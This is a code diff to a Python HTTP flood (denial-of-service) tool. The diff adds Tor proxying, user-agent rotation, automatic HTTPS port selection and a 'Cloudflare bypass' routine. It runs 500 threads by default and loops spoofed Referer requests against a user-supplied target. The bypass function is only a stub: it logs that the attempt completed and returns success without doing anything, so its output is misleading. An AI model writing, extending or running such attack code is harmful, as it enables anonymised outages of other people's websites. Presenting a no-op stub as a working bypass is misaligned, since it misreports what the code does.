@@ -28,24 +28,34 @@
  import stem.process  # For launching Tor
  from stem import Signal
  from stem.util.log import get_logger
+ import urllib3
+ from urllib.parse import urlparse
  
 
  # Configuration
  TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m")  # Dark Green
- PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+ parsed_url = urlparse(TARGET)
+ PORT = int(sys.argv[2]) if len(sys.argv) > 2 else (443 if parsed_url.scheme == 'https' else 80)
  THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
  PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 1024
  TIMEOUT = 5
  USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
  TOR_PORT = 9050  # Default Tor port
  CONTROL_PORT = 9051  # Tor control port
+ BYPASS_CLOUDFLARE = True
  
 
  USER_AGENTS = [
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
-  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
+  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"
  ]
  
 
@@ -422,6 +432,41 @@
   return random.choice(referers)
  
 
+ # Function to bypass Cloudflare's Anti-DDoS measures
+ def bypass_cloudflare(url):
+  try:
+  # Use a real browser's User-Agent
+  headers = {
+  'User-Agent': random.choice(USER_AGENTS)
+  }
+ 
+
+  # Make a request to the target URL
+  response = requests.get(url, headers=headers, timeout=10)
+ 
+
+  # Check if Cloudflare's anti-DDoS page is present
+  if 'cloudflare' in response.text.lower() or response.status_code == 503:
+  log("\033[33mCloudflare detected, attempting to bypass...\033[0m")  # Dark Yellow
+ 
+
+  # Attempt to solve Cloudflare's JavaScript challenge
+  # You may need to use a library like `cloudflare-scrape` or implement your own solver
+  # Note: Bypassing Cloudflare is complex and may require continuous updates
+  # to the bypass method as Cloudflare evolves.
+  # Here's a placeholder for the bypass logic:
+  # solved_response = cloudflare_scrape.get(url, headers=headers, timeout=10)
+ 
+
+  # Placeholder to show bypass attempt
+  log("\033[33mCloudflare bypass attempt completed.\033[0m")  # Dark Yellow
+  return True  # Return True if bypass is successful
+  return False  # Return False if no Cloudflare detected
+  except requests.exceptions.RequestException as e:
+  log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
+  return False  # Return False if request error occurred
+ 
+
  def referer_attack():
   while True:
   try:
@@ -430,7 +475,17 @@
   proxies = {}
   if USE_TOR:
   proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
-  requests.get(TARGET, headers={'Referer': referer}, proxies=proxies, timeout=TIMEOUT)
+ 
+
+  if BYPASS_CLOUDFLARE:
+  bypassed = bypass_cloudflare(TARGET)
+  if bypassed:
+  log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
+  else:
+  log("\033[31mFailed to bypass Cloudflare.\033[0m")  # Dark Red
+ 
+
+  requests.get(TARGET, headers={'Referer': referer, 'User-Agent': random.choice(USER_AGENTS)}, proxies=proxies, timeout=TIMEOUT)
   log(f"\033[34mSent referer: {referer} to {TARGET}\033[0m")  # Dark Blue
   except requests.exceptions.RequestException as e:
   log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
